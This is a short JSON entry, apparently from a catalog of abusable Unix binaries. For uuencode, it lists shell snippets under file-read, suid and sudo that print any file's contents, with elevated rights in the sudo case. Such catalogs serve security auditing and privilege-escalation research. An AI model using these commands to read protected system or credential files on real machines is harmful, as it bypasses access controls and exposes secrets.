{
  "functions": {
    "file-read": [
      {
        "code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
      }
    ],
    "suid": [
      {
        "code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
      }
    ],
    "sudo": [
      {
        "code": "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
      }
    ]
  }
}
